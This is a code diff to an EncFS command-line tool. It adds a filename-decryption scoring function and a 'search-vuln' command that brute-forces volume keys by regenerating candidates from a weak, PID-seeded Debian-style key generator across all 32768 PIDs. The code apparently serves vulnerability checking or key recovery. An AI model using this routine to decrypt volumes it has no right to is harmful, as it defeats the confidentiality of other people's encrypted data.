@@ -569,6 +569,85 @@ static int ckpasswdAutomaticly(int argc, char **argv) {
   return do_chpasswd(true, false, true, argc, argv);
 }
 
+
+
+/**
+ * Some decoding failures are to be ignored. This includes e.g. encfs config
+ * files and their backups. (We simply match .encfs*)
+ */
+static bool isIgnoredFilename(const char *fn_base) {
+	return strncmp(fn_base, ".encfs", strlen(".encfs")) == 0;
+}
+
+/**
+ * CruftScore(tm) is computed by attempting decryption of the filenames in the
+ * volume. Successful decode adds one, failed decode subtracts one. The
+ * process works recursively unless the cruft score for the files alone
+ * exceed some limit. (i.e. if the filenames alone produce many decode errors
+ * then there is no need to recurse further, if the caller wishes).
+ */
+int computeCruftScore(
+	const std::shared_ptr<EncFS_Root> &rootInfo,
+	const char *dirName,
+	int minScore, int maxScore
+) {
+	int found = 0;
+
+	DirTraverse dt = rootInfo->root->openDir(dirName);
+	if (!dt.valid()) {
+		// ???
+		return 0;
+	}
+	for (string name = dt.nextInvalid(); !name.empty(); name = dt.nextInvalid()) {
+		if (isIgnoredFilename(name.c_str())) {
+			// cout << "* " << name << "\n";
+			continue;
+		}
+
+		found--;
+		// cout << "- " << name << " now " << found << "\n";
+	}
+
+	// now go back and look for directories to recurse into..
+	dt = rootInfo->root->openDir(dirName);
+	if (!dt.valid()) {
+		// ???
+		return 0;
+	}
+	for (string name = dt.nextPlaintextName(); !name.empty(); name = dt.nextPlaintextName()) {
+		if (name == "." || name == "..") continue;
+
+		string plainPath = dirName;
+		plainPath += '/';
+		plainPath += name;
+		found++;
+		// cout << "+ " << plainPath << " now " << found << "\n";
+
+		string cpath = rootInfo->root->cipherPath(plainPath.c_str());
+
+		if (isDirectory(cpath.c_str())) {
+			found += computeCruftScore(rootInfo, plainPath.c_str(), minScore - found, maxScore + found);
+		}
+		if ((found <= minScore) || (found >= maxScore)) {
+			// can stop early
+			// cout << "stopping early\n";
+			return found;
+		}
+	}
+
+	return found;
+}
+
+
+
+
+
+
+
+
+
+
+
 static void println_buf(unsigned char *buf, int len) {
 	for (int i = 0; i < len; i++) {
 		printf("%02x ", buf[i]);
@@ -957,7 +1036,38 @@ int main(int argc, char **argv) {
 		}
 		cerr << "If the following listing shows more than . and .., then the key was correct:\n";
 		list_files(rootPtr);
+		int cruftScore = computeCruftScore(rootPtr, "/", -3, +3);
+		cout << "total score: " << cruftScore << "\n";
 		return EXIT_SUCCESS;
+	} else if (!strcmp(command, "search-vuln")) {
+		int keylen = cipher->rawKeySize();
+		unsigned char *keybytes = (unsigned char*) malloc(keylen);
+
+		int numcand = 0;
+		// TODO: Try additional generators
+		EncfsShaOnDebianKeygen keygen(Arch_i386, 4);
+		for (int pid = 0; pid <= 32768; pid++) {
+			keygen.setPID(pid);
+			keygen.generateKeybytes(keybytes, keylen);
+
+			std::shared_ptr<EncFS_Opts> opts(new EncFS_Opts());
+			opts->rootDir = rootDir;
+			opts->createIfNotFound = false;
+			opts->checkKey = false; // meaningless anyway, we can only *guess* if it's the correct key
+			opts->volumeKeyData = keybytes;
+			opts->volumeKeyLen = keylen;
+			RootPtr rootPtr = initFS(ctx.get(), opts);
+			if (!rootPtr) {
+				cerr << "Unable to open " << rootDir << " as an EncFS volume\n";
+				return EXIT_FAILURE;
+			}
+			int cruftScore = computeCruftScore(rootPtr, "/", -3, +3);
+			if (cruftScore >= 0) {
+				cout << "key candidate (score " << cruftScore << "): esd i386 4 " << pid << "\n";
+				numcand++;
+			}
+		}
+		return numcand > 0 ? EXIT_SUCCESS : EXIT_FAILURE;
 	}
 
 
